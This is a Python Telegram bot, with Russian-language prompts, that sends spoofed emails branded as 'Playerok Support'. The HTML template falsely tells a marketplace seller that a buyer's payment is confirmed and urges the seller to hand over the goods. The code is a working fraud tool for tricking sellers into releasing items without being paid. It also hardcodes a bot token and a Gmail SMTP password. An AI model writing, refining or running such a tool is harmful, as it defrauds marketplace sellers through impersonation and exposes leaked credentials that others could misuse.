import os, asyncio, logging, smtplib, json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8777068569:AAE5iGFl9_EViPqopOoCCDDIleWPepXdG6M'
SMTP_USER = 'playerok.messagerobot@gmail.com'
SMTP_PASS = 'zpmjyqkmrnshvvln' 

bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class OrderState(StatesGroup):
    waiting_email = State()
    waiting_seller = State()
    waiting_amount = State()
    waiting_item = State()
    waiting_buyer = State()

# --- ТВОЙ ИДЕАЛЬНЫЙ ШАБЛОН ДЛЯ ПОЧТЫ ---
def get_html_template(seller, amount, item, buyer):
    return f"""
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <style>
        :root {{
            --bg-dark: #0a0a0a; --bg-card: #141414; --header-blue: #3291ff;
            --header-cyan: #00c2ff; --playerok-blue: #3586ff; --text-main: #ffffff;
            --text-gray: #828282; --green-price: #00a651; --status-green-bg: #1a8944;
            --action-bg: #1c1814; --action-orange: #d29922; --action-text: #e19d55;
            --border: #262626; --seller-badge: #2a2444; --seller-text: #9a8cff;
        }}
        body {{ background-color: #0a0a0a; color: #ffffff; font-family: 'Inter', Arial, sans-serif; margin: 0; padding: 20px; }}
        .wrapper {{ max-width: 420px; margin: 0 auto; }}
        .header {{ background: linear-gradient(90deg, #3291ff 0%, #00c2ff 100%); border-radius: 20px 20px 10px 10px; padding: 24px; margin-bottom: 12px; }}
        .header-title h2 {{ margin: 0; font-size: 21px; color: white; }}
        .header-title p {{ margin: 8px 0 0 0; font-size: 12px; opacity: 0.9; color: white; }}
        .logo {{ background: white; color: black; padding: 8px 12px; border-radius: 6px; font-weight: 900; float: right; margin-top: -40px; }}
        .card {{ background-color: #141414; border-radius: 22px; padding: 20px; margin-bottom: 12px; border: 1px solid #262626; }}
        .seller-tag {{ background-color: #2a2444; color: #9a8cff; padding: 5px 12px; border-radius: 12px; font-size: 11px; font-weight: 700; float: right; }}
        .label {{ color: #828282; font-size: 13px; margin-bottom: 8px; }}
        .status-confirmed {{ background-color: #1a8944; color: white; padding: 7px 14px; border-radius: 10px; font-size: 13px; font-weight: 800; display: inline-block; margin-bottom: 15px; }}
        .price {{ color: #00a651; font-size: 28px; font-weight: 800; margin: 0 0 15px 0; }}
        .val {{ font-weight: 700; font-size: 14px; color: white; }}
        .val-green {{ color: #00a651; font-weight: 800; }}
        .action-card {{ background-color: #1c1814; border-left: 4px solid #d29922; }}
        .action-title {{ color: #e19d55; font-size: 13px; font-weight: 800; text-transform: uppercase; margin-bottom: 10px; }}
        .buyer-chip {{ background: #111; padding: 3px 8px; border: 1px solid #333; border-radius: 6px; font-weight: 700; color: white; }}
        .sec-list {{ list-style: none; padding: 0; margin: 0 0 15px 0; font-size: 14px; color: #eee; }}
        .btn-tg {{ background: #111; border: 1px solid #262626; text-align: center; padding: 14px; border-radius: 12px; font-weight: 700; color: white; text-decoration: none; display: block; }}
        .footer {{ text-align: center; color: #828282; font-size: 11px; margin-top: 10px; }}
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header">
        <div class="header-title">
            <h2>Playerok • Сделка</h2>
            <p>Системное уведомление • Оплата подтверждена внутри платформы</p>
        </div>
        <div class="logo">Player<span style="color:#3586ff">ok</span></div>
    </div>
    <div class="card">
        <div class="seller-tag">Seller</div>
        <div style="font-weight: 700; font-size: 17px; color: white;">👋 Здравствуйте, @{seller}</div>
    </div>
    <div class="card">
        <div class="label">Статус</div>
        <div class="status-confirmed">✅ ОПЛАТА ПОДТВЕРЖДЕНА</div>
        <div class="label">Сумма</div>
        <div class="price">{amount} ₽</div>
        <div style="color: #828282; font-size: 14px;">Оплата по сделке зафиксирована системой. Передайте товар покупателю и дождитесь подтверждения.</div>
    </div>
    <div class="card">
        <div class="label" style="margin-bottom: 18px;">Детали сделки</div>
        <div style="margin-bottom:16px;">
            <div class="label">Товар</div>
            <span class="val">{item}</span>
        </div>
        <div style="margin-bottom:16px;">
            <div class="label">Статус</div>
            <span class="val-green">Оплачено</span>
        </div>
        <div style="margin-bottom:16px;">
            <div class="label">Покупатель</div>
            <span class="val">@{buyer}</span>
        </div>
        <div>
            <div class="label">Сумма</div>
            <span class="val-green">{amount} ₽</span>
        </div>
    </div>
    <div class="card action-card">
        <div class="action-title">Действие сейчас</div>
        <div style="margin-bottom: 10px; font-size: 14px; color: white;">
            Передайте товар покупателю: <span class="buyer-chip">@{buyer}</span>
        </div>
        <div style="color: #828282; font-size: 13px;">После подтверждения передачи средства зачислятся автоматически.</div>
    </div>
    <div class="card">
        <div class="label" style="margin-bottom: 15px;">Безопасность / Проверка</div>
        <ul class="sec-list">
            <li>• Сверьте покупателя: <b>@{buyer}</b></li>
            <li>• Мы не запрашиваем коды/пароли и не подтверждаем сделки “вне платформы”</li>
            <li>• Передавайте товар только в рамках этой сделки</li>
        </ul>
        <div class="btn-tg">Открыть поддержку в Telegram</div>
        <div class="footer">Официальный контакт: @Helper_PlayerOK</div>
        <div class="footer" style="opacity: 0.3; margin-top: 8px;">© 2026 Playerok</div>
    </div>
</div>
</body>
</html>
    """

def send_email(to_email, seller, amount, item, buyer):
    msg = MIMEMultipart()
    msg['Subject'] = "Заказ №4523FDKG33"
    msg['From'] = f"Playerok Support <{SMTP_USER}>"
    msg['To'] = to_email
    msg.attach(MIMEText(get_html_template(seller, amount, item, buyer), 'html'))
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)

# --- ЛОГИКА БОТА ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await message.answer("✉️ **Создание заказа №4523FDKG33**\n\n1️⃣ Введите **Email** получателя:", parse_mode="Markdown")
    await state.set_state(OrderState.waiting_email)

@dp.message(OrderState.waiting_email)
async def p_email(m: types.Message, state: FSMContext):
    await state.update_data(email=m.text)
    await m.answer("2️⃣ Введите **Ник продавца** (например: Fiko Store):")
    await state.set_state(OrderState.waiting_seller)

@dp.message(OrderState.waiting_seller)
async def p_seller(m: types.Message, state: FSMContext):
    await state.update_data(seller=m.text)
    await m.answer("3️⃣ Введите **Сумму** (число):")
    await state.set_state(OrderState.waiting_amount)

@dp.message(OrderState.waiting_amount)
async def p_amount(m: types.Message, state: FSMContext):
    await state.update_data(amount=m.text)
    await m.answer("4️⃣ Введите **Название товара**:")
    await state.set_state(OrderState.waiting_item)

@dp.message(OrderState.waiting_item)
async def p_item(m: types.Message, state: FSMContext):
    await state.update_data(item=m.text)
    await m.answer("5️⃣ Введите **Ник покупателя**:")
    await state.set_state(OrderState.waiting_buyer)

@dp.message(OrderState.waiting_buyer)
async def p_final(m: types.Message, state: FSMContext):
    d = await state.get_data()
    try:
        send_email(d['email'], d['seller'], d['amount'], d['item'], m.text)
        await m.answer(f"✅ **Письмо отправлено!**\nТема: Заказ №4523FDKG33\nПолучатель: {d['email']}")
    except Exception as e:
        await m.answer(f"❌ Ошибка: {e}")
    await state.clear()

async def main():
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Bot is Live"))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', int(os.environ.get("PORT", 8080))).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
